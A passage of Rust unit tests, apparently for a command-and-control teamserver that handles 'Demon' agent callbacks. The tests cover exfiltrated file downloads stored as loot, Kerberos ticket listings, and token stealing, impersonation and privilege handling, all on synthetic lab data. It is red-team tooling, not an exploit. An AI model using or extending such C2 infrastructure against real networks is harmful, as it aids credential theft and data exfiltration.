        assert_eq!(tracker.buffered_bytes().await, 2);
        assert_eq!(
            tracker.finish(0xABCD_EF56, 0x61).await,
            Some(DownloadState {
                request_id: 0xF1,
                remote_path: "C:\\Temp\\idle-00000061.bin".to_owned(),
                expected_size: 32,
                data: b"34".to_vec(),
                started_at: "2026-03-11T09:20:00Z".to_owned(),
            })
        );
    }

    #[tokio::test]
    async fn builtin_beacon_file_callbacks_reassemble_downloads()
    -> Result<(), Box<dyn std::error::Error>> {
        let database = Database::connect_in_memory().await?;
        let registry = AgentRegistry::new(database.clone());
        let events = EventBus::default();
        let mut receiver = events.subscribe();
        let sockets = SocketRelayManager::new(registry.clone(), events.clone());
        registry
            .insert(sample_agent_info(
                0xABCD_EF21,
                [0x11; AGENT_KEY_LENGTH],
                [0x22; AGENT_IV_LENGTH],
            ))
            .await?;
        let dispatcher = CommandDispatcher::with_builtin_handlers(
            registry,
            events,
            database.clone(),
            sockets,
            None,
        );

        let file_id = 0x55_u32;
        let remote_path = "C:\\Windows\\Temp\\note.txt";
        let content = b"beacon-chunk";

        let mut open_header = Vec::new();
        open_header.extend_from_slice(&file_id.to_be_bytes());
        open_header.extend_from_slice(&(u32::try_from(content.len())?).to_be_bytes());
        open_header.extend_from_slice(remote_path.as_bytes());
        let mut open = Vec::new();
        add_u32(&mut open, u32::from(DemonCallback::File));
        add_bytes(&mut open, &open_header);
        dispatcher
            .dispatch(0xABCD_EF21, u32::from(DemonCommand::BeaconOutput), 0x77, &open)
            .await?;

        let mut chunk = Vec::new();
        chunk.extend_from_slice(&file_id.to_be_bytes());
        chunk.extend_from_slice(content);
        let mut write = Vec::new();
        add_u32(&mut write, u32::from(DemonCallback::FileWrite));
        add_bytes(&mut write, &chunk);
        dispatcher
            .dispatch(0xABCD_EF21, u32::from(DemonCommand::BeaconOutput), 0x77, &write)
            .await?;

        let mut close = Vec::new();
        add_u32(&mut close, u32::from(DemonCallback::FileClose));
        add_bytes(&mut close, &file_id.to_be_bytes());
        dispatcher
            .dispatch(0xABCD_EF21, u32::from(DemonCommand::BeaconOutput), 0x77, &close)
            .await?;

        let _ = receiver.recv().await.ok_or("missing beacon open event")?;
        let _ = receiver.recv().await.ok_or("missing beacon progress event")?;
        let loot_event = receiver.recv().await.ok_or("missing beacon loot event")?;
        let final_event = receiver.recv().await.ok_or("missing beacon completion event")?;
        let OperatorMessage::AgentResponse(loot_message) = loot_event else {
            panic!("expected beacon file loot event");
        };
        assert_eq!(
            loot_message.info.extra.get("MiscType"),
            Some(&Value::String("loot-new".to_owned()))
        );
        let OperatorMessage::AgentResponse(message) = final_event else {
            panic!("expected beacon file completion response");
        };
        assert_eq!(message.info.extra.get("MiscType"), Some(&Value::String("download".to_owned())));

        let loot = database.loot().list_for_agent(0xABCD_EF21).await?;
        assert_eq!(loot.len(), 1);
        assert_eq!(loot[0].data.as_deref(), Some(content.as_slice()));
        assert_eq!(loot[0].file_path.as_deref(), Some(remote_path));
        Ok(())
    }

    #[tokio::test]
    async fn builtin_beacon_file_callbacks_accumulate_partial_downloads_until_close()
    -> Result<(), Box<dyn std::error::Error>> {
        let database = Database::connect_in_memory().await?;
        let registry = AgentRegistry::new(database.clone());
        let events = EventBus::default();
        let mut receiver = events.subscribe();
        let sockets = SocketRelayManager::new(registry.clone(), events.clone());
        registry
            .insert(sample_agent_info(
                0xABCD_EF22,
                [0x11; AGENT_KEY_LENGTH],
                [0x22; AGENT_IV_LENGTH],
            ))
            .await?;
        let dispatcher = CommandDispatcher::with_builtin_handlers(
            registry,
            events,
            database.clone(),
            sockets,
            None,
        );

        let file_id = 0x56_u32;
        let remote_path = "C:\\Windows\\Temp\\partial.txt";

        dispatcher
            .dispatch(
                0xABCD_EF22,
                u32::from(DemonCommand::BeaconOutput),
                0x78,
                &beacon_file_open(file_id, 32, remote_path),
            )
            .await?;
        dispatcher
            .dispatch(
                0xABCD_EF22,
                u32::from(DemonCommand::BeaconOutput),
                0x78,
                &beacon_file_write(file_id, b"beacon-"),
            )
            .await?;
        dispatcher
            .dispatch(
                0xABCD_EF22,
                u32::from(DemonCommand::BeaconOutput),
                0x78,
                &beacon_file_write(file_id, b"chunk"),
            )
            .await?;

        assert!(database.loot().list_for_agent(0xABCD_EF22).await?.is_empty());

        let _ = receiver.recv().await.ok_or("missing beacon open event")?;
        let progress_one = receiver.recv().await.ok_or("missing first beacon progress event")?;
        let progress_two = receiver.recv().await.ok_or("missing second beacon progress event")?;

        let OperatorMessage::AgentResponse(progress_one) = progress_one else {
            panic!("expected first beacon progress response");
        };
        assert_eq!(
            progress_one.info.extra.get("CurrentSize"),
            Some(&Value::String("7".to_owned()))
        );
        assert_eq!(
            progress_one.info.extra.get("ExpectedSize"),
            Some(&Value::String("32".to_owned()))
        );

        let OperatorMessage::AgentResponse(progress_two) = progress_two else {
            panic!("expected second beacon progress response");
        };
        assert_eq!(
            progress_two.info.extra.get("CurrentSize"),
            Some(&Value::String("12".to_owned()))
        );
        assert_eq!(
            progress_two.info.extra.get("ExpectedSize"),
            Some(&Value::String("32".to_owned()))
        );
        let active = dispatcher.downloads.active_for_agent(0xABCD_EF22).await;
        assert_eq!(active.len(), 1);
        assert_eq!(active[0].0, file_id);
        assert_eq!(active[0].1.request_id, 0x78);
        assert_eq!(active[0].1.remote_path, remote_path);
        assert_eq!(active[0].1.expected_size, 32);
        assert_eq!(active[0].1.data, b"beacon-chunk");
        assert!(
            !active[0].1.started_at.is_empty(),
            "active beacon download should preserve its start timestamp"
        );
        assert!(
            timeout(Duration::from_millis(50), receiver.recv()).await.is_err(),
            "beacon download should remain incomplete until close"
        );

        dispatcher
            .dispatch(
                0xABCD_EF22,
                u32::from(DemonCommand::BeaconOutput),
                0x78,
                &beacon_file_close(file_id),
            )
            .await?;

        let _ = receiver.recv().await.ok_or("missing beacon loot event")?;
        let completion = receiver.recv().await.ok_or("missing beacon completion event")?;
        let OperatorMessage::AgentResponse(completion) = completion else {
            panic!("expected beacon completion response");
        };
        assert_eq!(
            completion.info.extra.get("MiscData"),
            Some(&Value::String(BASE64_STANDARD.encode(b"beacon-chunk")))
        );

        let loot = database.loot().list_for_agent(0xABCD_EF22).await?;
        assert_eq!(loot.len(), 1);
        assert_eq!(loot[0].data.as_deref(), Some(b"beacon-chunk".as_slice()));
        assert_eq!(loot[0].file_path.as_deref(), Some(remote_path));
        Ok(())
    }

    #[tokio::test]
    async fn builtin_beacon_file_callbacks_reject_writes_without_open()
    -> Result<(), Box<dyn std::error::Error>> {
        let database = Database::connect_in_memory().await?;
        let registry = AgentRegistry::new(database.clone());
        let events = EventBus::default();
        let mut receiver = events.subscribe();
        let sockets = SocketRelayManager::new(registry.clone(), events.clone());
        registry
            .insert(sample_agent_info(
                0xABCD_EF23,
                [0x11; AGENT_KEY_LENGTH],
                [0x22; AGENT_IV_LENGTH],
            ))
            .await?;
        let dispatcher = CommandDispatcher::with_builtin_handlers(
            registry,
            events,
            database.clone(),
            sockets,
            None,
        );

        let error = dispatcher
            .dispatch(
                0xABCD_EF23,
                u32::from(DemonCommand::BeaconOutput),
                0x79,
                &beacon_file_write(0x57, b"orphan"),
            )
            .await
            .expect_err("beacon file write without open should fail");
        assert!(matches!(
            error,
            CommandDispatchError::InvalidCallbackPayload {
                command_id,
                message,
            } if command_id == u32::from(DemonCommand::BeaconOutput)
                && message == "download 0x00000057 was not opened"
        ));
        assert!(
            timeout(Duration::from_millis(50), receiver.recv()).await.is_err(),
            "unexpected events for rejected beacon download write"
        );
        assert!(database.loot().list_for_agent(0xABCD_EF23).await?.is_empty());
        Ok(())
    }

    #[tokio::test]
    async fn builtin_filesystem_download_handler_drops_downloads_over_limit()
    -> Result<(), Box<dyn std::error::Error>> {
        let database = Database::connect_in_memory().await?;
        let registry = AgentRegistry::new(database.clone());
        let events = EventBus::default();
        let mut receiver = events.subscribe();
        let sockets = SocketRelayManager::new(registry.clone(), events.clone());
        registry
            .insert(sample_agent_info(
                0xABCD_EF31,
                [0x11; AGENT_KEY_LENGTH],
                [0x22; AGENT_IV_LENGTH],
            ))
            .await?;
        let dispatcher = CommandDispatcher::with_builtin_handlers_and_max_download_bytes(
            registry,
            events,
            database.clone(),
            sockets,
            None,
            4,
        );

        let file_id = 0x91_u32;
        let mut open = Vec::new();
        add_u32(&mut open, u32::from(DemonFilesystemCommand::Download));
        add_u32(&mut open, 0);
        add_u32(&mut open, file_id);
        add_u64(&mut open, 8);
        add_utf16(&mut open, "C:\\Temp\\oversized.bin");
        dispatcher.dispatch(0xABCD_EF31, u32::from(DemonCommand::CommandFs), 0x99, &open).await?;

        let mut write = Vec::new();
        add_u32(&mut write, u32::from(DemonFilesystemCommand::Download));
        add_u32(&mut write, 1);
        add_u32(&mut write, file_id);
        add_bytes(&mut write, b"12345");
        let error = dispatcher
            .dispatch(0xABCD_EF31, u32::from(DemonCommand::CommandFs), 0x99, &write)
            .await
            .expect_err("oversized download should be rejected");
        assert!(matches!(
            error,
            crate::CommandDispatchError::DownloadTooLarge {
                agent_id: 0xABCD_EF31,
                file_id: 0x91,
                max_download_bytes: 4,
            }
        ));

        let open_event = receiver.recv().await.ok_or("missing open event")?;
        let OperatorMessage::AgentResponse(open_message) = open_event else {
            panic!("expected download open response");
        };
        assert_eq!(
            open_message.info.extra.get("MiscType"),
            Some(&Value::String("download-progress".to_owned()))
        );
        assert!(
            timeout(Duration::from_millis(50), receiver.recv()).await.is_err(),
            "oversized download should not emit progress or completion events"
        );
        assert!(database.loot().list_for_agent(0xABCD_EF31).await?.is_empty());

        let mut close = Vec::new();
        add_u32(&mut close, u32::from(DemonFilesystemCommand::Download));
        add_u32(&mut close, 2);
        add_u32(&mut close, file_id);
        add_u32(&mut close, 0);
        assert_eq!(
            dispatcher
                .dispatch(0xABCD_EF31, u32::from(DemonCommand::CommandFs), 0x99, &close)
                .await?,
            None
        );
        Ok(())
    }

    #[tokio::test]
    async fn builtin_beacon_file_callbacks_drop_downloads_over_limit()
    -> Result<(), Box<dyn std::error::Error>> {
        let database = Database::connect_in_memory().await?;
        let registry = AgentRegistry::new(database.clone());
        let events = EventBus::default();
        let mut receiver = events.subscribe();
        let sockets = SocketRelayManager::new(registry.clone(), events.clone());
        registry
            .insert(sample_agent_info(
                0xABCD_EF41,
                [0x11; AGENT_KEY_LENGTH],
                [0x22; AGENT_IV_LENGTH],
            ))
            .await?;
        let dispatcher = CommandDispatcher::with_builtin_handlers_and_max_download_bytes(
            registry,
            events,
            database.clone(),
            sockets,
            None,
            4,
        );

        let file_id = 0x92_u32;
        let mut open_header = Vec::new();
        open_header.extend_from_slice(&file_id.to_be_bytes());
        open_header.extend_from_slice(&8_u32.to_be_bytes());
        open_header.extend_from_slice(b"C:\\Windows\\Temp\\oversized.txt");
        let mut open = Vec::new();
        add_u32(&mut open, u32::from(DemonCallback::File));
        add_bytes(&mut open, &open_header);
        dispatcher
            .dispatch(0xABCD_EF41, u32::from(DemonCommand::BeaconOutput), 0x77, &open)
            .await?;

        let mut chunk = Vec::new();
        chunk.extend_from_slice(&file_id.to_be_bytes());
        chunk.extend_from_slice(b"12345");
        let mut write = Vec::new();
        add_u32(&mut write, u32::from(DemonCallback::FileWrite));
        add_bytes(&mut write, &chunk);
        let error = dispatcher
            .dispatch(0xABCD_EF41, u32::from(DemonCommand::BeaconOutput), 0x77, &write)
            .await
            .expect_err("oversized beacon download should be rejected");
        assert!(matches!(
            error,
            crate::CommandDispatchError::DownloadTooLarge {
                agent_id: 0xABCD_EF41,
                file_id: 0x92,
                max_download_bytes: 4,
            }
        ));

        let open_event = receiver.recv().await.ok_or("missing beacon open event")?;
        let OperatorMessage::AgentResponse(open_message) = open_event else {
            panic!("expected beacon open response");
        };
        assert_eq!(
            open_message.info.extra.get("MiscType"),
            Some(&Value::String("download-progress".to_owned()))
        );
        assert!(
            timeout(Duration::from_millis(50), receiver.recv()).await.is_err(),
            "oversized beacon download should not emit progress or completion events"
        );
        assert!(database.loot().list_for_agent(0xABCD_EF41).await?.is_empty());

        let mut close = Vec::new();
        add_u32(&mut close, u32::from(DemonCallback::FileClose));
        add_bytes(&mut close, &file_id.to_be_bytes());
        assert_eq!(
            dispatcher
                .dispatch(0xABCD_EF41, u32::from(DemonCommand::BeaconOutput), 0x77, &close)
                .await?,
            None
        );
        Ok(())
    }

    #[tokio::test]
    async fn builtin_kerberos_klist_handler_formats_ticket_output()
    -> Result<(), Box<dyn std::error::Error>> {
        let database = Database::connect_in_memory().await?;
        let registry = AgentRegistry::new(database.clone());
        let events = EventBus::default();
        let mut receiver = events.subscribe();
        let sockets = SocketRelayManager::new(registry.clone(), events.clone());
        let dispatcher =
            CommandDispatcher::with_builtin_handlers(registry, events, database, sockets, None);

        let mut payload = Vec::new();
        add_u32(&mut payload, u32::from(DemonKerberosCommand::Klist));
        add_u32(&mut payload, 1);
        add_u32(&mut payload, 1);
        add_utf16(&mut payload, "alice");
        add_utf16(&mut payload, "LAB");
        add_u32(&mut payload, 0x1234);
        add_u32(&mut payload, 0x5678);
        add_u32(&mut payload, 1);
        add_utf16(&mut payload, "S-1-5-21");
        add_u32(&mut payload, 0xD53E_8000);
        add_u32(&mut payload, 0x019D_B1DE);
        add_u32(&mut payload, 2);
        add_utf16(&mut payload, "Kerberos");
        add_utf16(&mut payload, "DC01");
        add_utf16(&mut payload, "lab.local");
        add_utf16(&mut payload, "alice@lab.local");
        add_u32(&mut payload, 1);
        add_utf16(&mut payload, "alice");
        add_utf16(&mut payload, "LAB.LOCAL");
        add_utf16(&mut payload, "krbtgt");
        add_utf16(&mut payload, "LAB.LOCAL");
        add_u32(&mut payload, 0xD53E_8000);
        add_u32(&mut payload, 0x019D_B1DE);
        add_u32(&mut payload, 0xD53E_8000);
        add_u32(&mut payload, 0x019D_B1DE);
        add_u32(&mut payload, 0xD53E_8000);
        add_u32(&mut payload, 0x019D_B1DE);
        add_u32(&mut payload, 18);
        add_u32(&mut payload, 0x4081_0000);
        add_bytes(&mut payload, b"ticket");

        dispatcher
            .dispatch(0x0102_0304, u32::from(DemonCommand::CommandKerberos), 9, &payload)
            .await?;

        let event = receiver.recv().await.ok_or_else(|| "kerberos response missing".to_owned())?;
        let OperatorMessage::AgentResponse(message) = event else {
            panic!("expected kerberos agent response event");
        };
        assert!(message.info.output.contains("UserName                : alice"));
        assert!(message.info.output.contains("Encryption type : AES256_CTS_HMAC_SHA1"));
        assert!(message.info.output.contains("Ticket          : dGlja2V0"));
        Ok(())
    }

    #[tokio::test]
    async fn token_steal_callback_broadcasts_success_event()
    -> Result<(), Box<dyn std::error::Error>> {
        let database = Database::connect_in_memory().await?;
        let registry = AgentRegistry::new(database.clone());
        let events = EventBus::default();
        let mut receiver = events.subscribe();
        let sockets = SocketRelayManager::new(registry.clone(), events.clone());
        let dispatcher =
            CommandDispatcher::with_builtin_handlers(registry, events, database, sockets, None);

        let mut payload = Vec::new();
        add_u32(&mut payload, u32::from(DemonTokenCommand::Steal));
        add_utf16(&mut payload, "LAB\\admin");
        add_u32(&mut payload, 3);
        add_u32(&mut payload, 1234);
        dispatcher
            .dispatch(0xAABB_CCDD, u32::from(DemonCommand::CommandToken), 10, &payload)
            .await?;

        let event = receiver.recv().await.ok_or("token steal response missing")?;
        let OperatorMessage::AgentResponse(message) = event else {
            panic!("expected agent response event");
        };
        let msg = message.info.extra.get("Message").and_then(|v| v.as_str()).unwrap_or("");
        assert_eq!(
            msg,
            "Successfully stole and impersonated token from 1234 User:[LAB\\admin] TokenID:[3]"
        );
        assert!(msg.contains("LAB\\admin"));
        assert!(msg.contains("TokenID:[3]"));
        Ok(())
    }

    #[tokio::test]
    async fn token_list_callback_formats_vault_table() -> Result<(), Box<dyn std::error::Error>> {
        let database = Database::connect_in_memory().await?;
        let registry = AgentRegistry::new(database.clone());
        let events = EventBus::default();
        let mut receiver = events.subscribe();
        let sockets = SocketRelayManager::new(registry.clone(), events.clone());
        let dispatcher =
            CommandDispatcher::with_builtin_handlers(registry, events, database, sockets, None);

        let mut payload = Vec::new();
        add_u32(&mut payload, u32::from(DemonTokenCommand::List));
        add_u32(&mut payload, 0);
        add_u32(&mut payload, 0xAB);
        add_utf16(&mut payload, "LAB\\svc");
        add_u32(&mut payload, 4444);
        add_u32(&mut payload, 1);
        add_u32(&mut payload, 1);
        dispatcher
            .dispatch(0xAABB_CCDD, u32::from(DemonCommand::CommandToken), 11, &payload)
            .await?;

        let event = receiver.recv().await.ok_or("token list response missing")?;
        let OperatorMessage::AgentResponse(message) = event else {
            panic!("expected agent response event");
        };
        assert!(message.info.output.contains("LAB\\svc"));
        assert!(message.info.output.contains("stolen"));
        assert!(message.info.output.contains("Yes"));
        Ok(())
    }

    #[tokio::test]
    async fn token_list_callback_empty_vault() -> Result<(), Box<dyn std::error::Error>> {
        let database = Database::connect_in_memory().await?;
        let registry = AgentRegistry::new(database.clone());
        let events = EventBus::default();
        let mut receiver = events.subscribe();
        let sockets = SocketRelayManager::new(registry.clone(), events.clone());
        let dispatcher =
            CommandDispatcher::with_builtin_handlers(registry, events, database, sockets, None);

        let mut payload = Vec::new();
        add_u32(&mut payload, u32::from(DemonTokenCommand::List));
        dispatcher
            .dispatch(0xAABB_CCDD, u32::from(DemonCommand::CommandToken), 12, &payload)
            .await?;

        let event = receiver.recv().await.ok_or("token list empty response missing")?;
        let OperatorMessage::AgentResponse(message) = event else {
            panic!("expected agent response event");
        };
        assert!(message.info.output.contains("token vault is empty"));
        Ok(())
    }

    #[tokio::test]
    async fn token_privs_list_callback_formats_privilege_table()
    -> Result<(), Box<dyn std::error::Error>> {
        let database = Database::connect_in_memory().await?;
        let registry = AgentRegistry::new(database.clone());
        let events = EventBus::default();
        let mut receiver = events.subscribe();
        let sockets = SocketRelayManager::new(registry.clone(), events.clone());
        let dispatcher =
            CommandDispatcher::with_builtin_handlers(registry, events, database, sockets, None);

        let mut payload = Vec::new();
        add_u32(&mut payload, u32::from(DemonTokenCommand::PrivsGetOrList));
        add_u32(&mut payload, 1);
        add_bytes(&mut payload, b"SeDebugPrivilege\0");
        add_u32(&mut payload, 3);
        add_bytes(&mut payload, b"SeShutdownPrivilege\0");
        add_u32(&mut payload, 0);
        dispatcher
            .dispatch(0xAABB_CCDD, u32::from(DemonCommand::CommandToken), 13, &payload)
            .await?;

        let event = receiver.recv().await.ok_or("token privs list response missing")?;
        let OperatorMessage::AgentResponse(message) = event else {
            panic!("expected agent response event");
        };
        assert!(message.info.output.contains("SeDebugPrivilege"));
        assert!(message.info.output.contains("Enabled"));
        assert!(message.info.output.contains("SeShutdownPrivilege"));
        assert!(message.info.output.contains("Disabled"));
        Ok(())
    }

    #[tokio::test]
    async fn token_privs_get_callback_success_and_failure() -> Result<(), Box<dyn std::error::Error>>
    {
        let database = Database::connect_in_memory().await?;
        let registry = AgentRegistry::new(database.clone());
        let events = EventBus::default();
        let mut receiver = events.subscribe();
        let sockets = SocketRelayManager::new(registry.clone(), events.clone());
        let dispatcher =
            CommandDispatcher::with_builtin_handlers(registry, events, database, sockets, None);

        let mut payload = Vec::new();
        add_u32(&mut payload, u32::from(DemonTokenCommand::PrivsGetOrList));
        add_u32(&mut payload, 0);
        add_u32(&mut payload, 1);
        add_bytes(&mut payload, b"SeDebugPrivilege\0");
        dispatcher
            .dispatch(0xAABB_CCDD, u32::from(DemonCommand::CommandToken), 14, &payload)
            .await?;

        let event = receiver.recv().await.ok_or("token privs get response missing")?;
        let OperatorMessage::AgentResponse(message) = event else {
            panic!("expected agent response event");
        };
        let msg = message.info.extra.get("Message").and_then(|v| v.as_str()).unwrap_or("");
        assert!(msg.contains("successfully enabled"));
        assert!(msg.contains("SeDebugPrivilege"));

        let mut payload = Vec::new();
        add_u32(&mut payload, u32::from(DemonTokenCommand::PrivsGetOrList));
        add_u32(&mut payload, 0);
        add_u32(&mut payload, 0);
        add_bytes(&mut payload, b"SeDebugPrivilege\0");
        dispatcher
            .dispatch(0xAABB_CCDD, u32::from(DemonCommand::CommandToken), 15, &payload)
            .await?;

        let event = receiver.recv().await.ok_or("token privs get failure response missing")?;
        let OperatorMessage::AgentResponse(message) = event else {
            panic!("expected agent response event");
        };
        let msg = message.info.extra.get("Message").and_then(|v| v.as_str()).unwrap_or("");
        assert!(msg.contains("Failed to enable"));
        Ok(())
    }

    #[tokio::test]
    async fn token_make_callback_success_and_empty() -> Result<(), Box<dyn std::error::Error>> {
        let database = Database::connect_in_memory().await?;
        let registry = AgentRegistry::new(database.clone());
        let events = EventBus::default();
        let mut receiver = events.subscribe();
        let sockets = SocketRelayManager::new(registry.clone(), events.clone());
        let dispatcher =
            CommandDispatcher::with_builtin_handlers(registry, events, database, sockets, None);

        let mut payload = Vec::new();
        add_u32(&mut payload, u32::from(DemonTokenCommand::Make));
        add_utf16(&mut payload, "LAB\\admin");
        dispatcher
            .dispatch(0xAABB_CCDD, u32::from(DemonCommand::CommandToken), 16, &payload)
            .await?;

        let event = receiver.recv().await.ok_or("token make response missing")?;
        let OperatorMessage::AgentResponse(message) = event else {
            panic!("expected agent response event");
        };
        let msg = message.info.extra.get("Message").and_then(|v| v.as_str()).unwrap_or("");
        assert!(msg.contains("Successfully created and impersonated token"));
        assert!(msg.contains("LAB\\admin"));

        let mut payload = Vec::new();
        add_u32(&mut payload, u32::from(DemonTokenCommand::Make));
        dispatcher
            .dispatch(0xAABB_CCDD, u32::from(DemonCommand::CommandToken), 17, &payload)
            .await?;

        let event = receiver.recv().await.ok_or("token make failure response missing")?;
        let OperatorMessage::AgentResponse(message) = event else {
            panic!("expected agent response event");
        };
        let msg = message.info.extra.get("Message").and_then(|v| v.as_str()).unwrap_or("");
        assert!(msg.contains("Failed to create token"));
        Ok(())
    }

    #[tokio::test]
    async fn token_getuid_callback_elevated_and_normal() -> Result<(), Box<dyn std::error::Error>> {
        let database = Database::connect_in_memory().await?;
        let registry = AgentRegistry::new(database.clone());
        let events = EventBus::default();
        let mut receiver = events.subscribe();
        let sockets = SocketRelayManager::new(registry.clone(), events.clone());
        let dispatcher =
            CommandDispatcher::with_builtin_handlers(registry, events, database, sockets, None);

        let mut payload = Vec::new();
        add_u32(&mut payload, u32::from(DemonTokenCommand::GetUid));
        add_u32(&mut payload, 1);
        add_utf16(&mut payload, "LAB\\admin");
        dispatcher
            .dispatch(0xAABB_CCDD, u32::from(DemonCommand::CommandToken), 18, &payload)
            .await?;

        let event = receiver.recv().await.ok_or("token getuid response missing")?;
        let OperatorMessage::AgentResponse(message) = event else {
            panic!("expected agent response event");
        };
        let msg = message.info.extra.get("Message").and_then(|v| v.as_str()).unwrap_or("");
        assert!(msg.contains("LAB\\admin"));
        assert!(msg.contains("(Admin)"));

        let mut payload = Vec::new();
        add_u32(&mut payload, u32::from(DemonTokenCommand::GetUid));
        add_u32(&mut payload, 0);
        add_utf16(&mut payload, "LAB\\user");
        dispatcher
            .dispatch(0xAABB_CCDD, u32::from(DemonCommand::CommandToken), 19, &payload)
            .await?;

        let event = receiver.recv().await.ok_or("token getuid normal response missing")?;
        let OperatorMessage::AgentResponse(message) = event else {
            panic!("expected agent response event");
        };
        let msg = message.info.extra.get("Message").and_then(|v| v.as_str()).unwrap_or("");
        assert!(msg.contains("LAB\\user"));
        assert!(!msg.contains("(Admin)"));
        Ok(())
    }

    #[tokio::test]
    async fn token_revert_callback_success_and_failure() -> Result<(), Box<dyn std::error::Error>> {
        let database = Database::connect_in_memory().await?;
        let registry = AgentRegistry::new(database.clone());
        let events = EventBus::default();
        let mut receiver = events.subscribe();
        let sockets = SocketRelayManager::new(registry.clone(), events.clone());
        let dispatcher =
            CommandDispatcher::with_builtin_handlers(registry, events, database, sockets, None);

        let mut payload = Vec::new();
        add_u32(&mut payload, u32::from(DemonTokenCommand::Revert));
        add_u32(&mut payload, 1);
        dispatcher
            .dispatch(0xAABB_CCDD, u32::from(DemonCommand::CommandToken), 20, &payload)
            .await?;

        let event = receiver.recv().await.ok_or("token revert response missing")?;
        let OperatorMessage::AgentResponse(message) = event else {
            panic!("expected agent response event");
        };
        let msg = message.info.extra.get("Message").and_then(|v| v.as_str()).unwrap_or("");
        assert!(msg.contains("reverted token to itself"));

        let mut payload = Vec::new();
        add_u32(&mut payload, u32::from(DemonTokenCommand::Revert));
        add_u32(&mut payload, 0);
        dispatcher
            .dispatch(0xAABB_CCDD, u32::from(DemonCommand::CommandToken), 21, &payload)
            .await?;

        let event = receiver.recv().await.ok_or("token revert failure response missing")?;
        let OperatorMessage::AgentResponse(message) = event else {
            panic!("expected agent response event");
        };
        let msg = message.info.extra.get("Message").and_then(|v| v.as_str()).unwrap_or("");
        assert!(msg.contains("Failed to revert"));
        Ok(())
    }

    #[tokio::test]
    async fn token_remove_callback_success_and_failure() -> Result<(), Box<dyn std::error::Error>> {
        let database = Database::connect_in_memory().await?;
        let registry = AgentRegistry::new(database.clone());
        let events = EventBus::default();
        let mut receiver = events.subscribe();
        let sockets = SocketRelayManager::new(registry.clone(), events.clone());
        let dispatcher =
            CommandDispatcher::with_builtin_handlers(registry, events, database, sockets, None);

        let mut payload = Vec::new();
        add_u32(&mut payload, u32::from(DemonTokenCommand::Remove));
        add_u32(&mut payload, 1);
        add_u32(&mut payload, 5);
        dispatcher
            .dispatch(0xAABB_CCDD, u32::from(DemonCommand::CommandToken), 22, &payload)
            .await?;

        let event = receiver.recv().await.ok_or("token remove response missing")?;
        let OperatorMessage::AgentResponse(message) = event else {
            panic!("expected agent response event");
        };
        let msg = message.info.extra.get("Message").and_then(|v| v.as_str()).unwrap_or("");
        assert!(msg.contains("removed token [5]"));

        let mut payload = Vec::new();
        add_u32(&mut payload, u32::from(DemonTokenCommand::Remove));
        add_u32(&mut payload, 0);
        add_u32(&mut payload, 5);
        dispatcher
            .dispatch(0xAABB_CCDD, u32::from(DemonCommand::CommandToken), 23, &payload)
            .await?;

        let event = receiver.recv().await.ok_or("token remove failure response missing")?;
        let OperatorMessage::AgentResponse(message) = event else {
            panic!("expected agent response event");
        };
        let msg = message.info.extra.get("Message").and_then(|v| v.as_str()).unwrap_or("");
        assert!(msg.contains("Failed to remove token [5]"));
        Ok(())
    }

    #[tokio::test]
    async fn token_clear_callback_broadcasts_success() -> Result<(), Box<dyn std::error::Error>> {
        let database = Database::connect_in_memory().await?;
        let registry = AgentRegistry::new(database.clone());
        let events = EventBus::default();
        let mut receiver = events.subscribe();
        let sockets = SocketRelayManager::new(registry.clone(), events.clone());
        let dispatcher =
            CommandDispatcher::with_builtin_handlers(registry, events, database, sockets, None);

        let mut payload = Vec::new();
        add_u32(&mut payload, u32::from(DemonTokenCommand::Clear));
        dispatcher
            .dispatch(0xAABB_CCDD, u32::from(DemonCommand::CommandToken), 24, &payload)
            .await?;

        let event = receiver.recv().await.ok_or("token clear response missing")?;
        let OperatorMessage::AgentResponse(message) = event else {
            panic!("expected agent response event");
        };
        let msg = message.info.extra.get("Message").and_then(|v| v.as_str()).unwrap_or("");
        assert!(msg.contains("Token vault has been cleared"));
        Ok(())
    }

    #[tokio::test]
    async fn token_find_tokens_callback_formats_table() -> Result<(), Box<dyn std::error::Error>> {
        let database = Database::connect_in_memory().await?;
        let registry = AgentRegistry::new(database.clone());
        let events = EventBus::default();
        let mut receiver = events.subscribe();
        let sockets = SocketRelayManager::new(registry.clone(), events.clone());
        let dispatcher =
            CommandDispatcher::with_builtin_handlers(registry, events, database, sockets, None);

        let mut payload = Vec::new();
        add_u32(&mut payload, u32::from(DemonTokenCommand::FindTokens));
        add_u32(&mut payload, 1);
        add_u32(&mut payload, 1);
        add_utf16(&mut payload, "LAB\\admin");
        add_u32(&mut payload, 5678);
        add_u32(&mut payload, 0x10);
        add_u32(&mut payload, 0x3000);
        add_u32(&mut payload, 2);
        add_u32(&mut payload, 1);
        dispatcher
            .dispatch(0xAABB_CCDD, u32::from(DemonCommand::CommandToken), 25, &payload)
            .await?;

        let event = receiver.recv().await.ok_or("token find response missing")?;
        let OperatorMessage::AgentResponse(message) = event else {
            panic!("expected agent response event");
        };
        assert!(message.info.output.contains("LAB\\admin"));
        assert!(message.info.output.contains("High"));
        assert!(message.info.output.contains("Primary"));
        assert!(message.info.output.contains("token steal"));
        Ok(())
    }

    #[tokio::test]
    async fn token_find_tokens_callback_failure() -> Result<(), Box<dyn std::error::Error>> {
        let database = Database::connect_in_memory().await?;
        let registry = AgentRegistry::new(database.clone());
        let events = EventBus::default();
        let mut receiver = events.subscribe();
        let sockets = SocketRelayManager::new(registry.clone(), events.clone());
        let dispatcher =
            CommandDispatcher::with_builtin_handlers(registry, events, database, sockets, None);

        let mut payload = Vec::new();
        add_u32(&mut payload, u32::from(DemonTokenCommand::FindTokens));
        add_u32(&mut payload, 0);
        dispatcher
            .dispatch(0xAABB_CCDD, u32::from(DemonCommand::CommandToken), 26, &payload)
            .await?;

        let event = receiver.recv().await.ok_or("token find failure response missing")?;
        let OperatorMessage::AgentResponse(message) = event else {
            panic!("expected agent response event");
        };
        let msg = message.info.extra.get("Message").and_then(|v| v.as_str()).unwrap_or("");
        assert!(msg.contains("Failed to list existing tokens"));
        Ok(())
    }

    #[tokio::test]
    async fn socket_read_callback_broadcasts_error_when_relay_delivery_fails()
    -> Result<(), Box<dyn std::error::Error>> {
        let database = Database::connect_in_memory().await?;
        let registry = AgentRegistry::new(database.clone());
        let events = EventBus::default();
        let mut receiver = events.subscribe();
        let sockets = SocketRelayManager::new(registry.clone(), events.clone());
        let dispatcher =
            CommandDispatcher::with_builtin_handlers(registry, events, database, sockets, None);

        let mut payload = Vec::new();
        add_u32(&mut payload, u32::from(DemonSocketCommand::Read));
        add_u32(&mut payload, 0x55);
        add_u32(&mut payload, u32::from(DemonSocketType::ReverseProxy));
        add_u32(&mut payload, 1);
